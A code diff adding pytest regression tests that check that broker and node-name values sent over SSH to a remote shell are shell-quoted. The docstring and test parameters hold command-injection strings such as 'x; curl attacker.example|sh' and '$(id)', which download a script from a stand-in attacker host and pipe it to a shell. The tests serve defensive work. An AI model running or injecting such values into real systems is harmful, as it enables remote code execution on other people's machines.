@@ -123,3 +123,49 @@ class TestTheLocalInstall:
 
 async def _noop(*_a: Any, **_kw: Any) -> None:
     return None
+
+
+class TestValuesHandedToTheRemoteShell:
+    """⚠ The launch command is a *string* sent over SSH, so every value in it is
+    shell syntax.
+
+    `broker` comes straight off the task payload with no validation at all, so
+    `--broker 'x; curl attacker|sh'` ran on the node. `node_name` is checked by
+    `deploy_name_error`, but that forbids only the MQTT topic characters
+    `# + /` — a space, a `;` or a `$(…)` is a perfectly acceptable node name as
+    far as it is concerned, and it reaches both the launch command and the
+    `pkill` pattern.
+    """
+
+    @pytest.mark.parametrize(
+        "hostile",
+        ["x; curl attacker.example|sh", "x && id", "$(id)", "`id`", "x | tee /tmp/x", "a b"],
+    )
+    def test_quoting_makes_a_hostile_value_one_argument(self, hostile: str) -> None:
+        import shlex
+
+        quoted = shlex.quote(hostile)
+
+        # One token after the shell has parsed it — nothing escapes to become
+        # another command.
+        assert shlex.split(f"--broker {quoted}") == ["--broker", hostile]
+
+    def test_the_node_name_validator_does_not_cover_this(self) -> None:
+        # Recorded because it is the reason quoting is required rather than
+        # optional: the validator's job is MQTT topics, not shells.
+        from wactorz.config import deploy_name_error
+
+        assert deploy_name_error("pi; curl attacker.example|sh") is None
+        assert deploy_name_error("pi $(id)") is None
+        assert deploy_name_error("pi/one") is not None  # what it *does* catch
+
+    def test_both_call_sites_quote_their_values(self) -> None:
+        # The pattern and the launch command are built in two places; a fix to
+        # one and not the other leaves the hole open.
+        from pathlib import Path
+
+        source = Path("wactorz/agents/installer_agent.py").read_text(encoding="utf-8")
+
+        assert "pkill -f {shlex.quote(pattern)}" in source
+        assert "--broker {shlex.quote(str(broker))}" in source
+        assert "--name {shlex.quote(node_name)}" in source
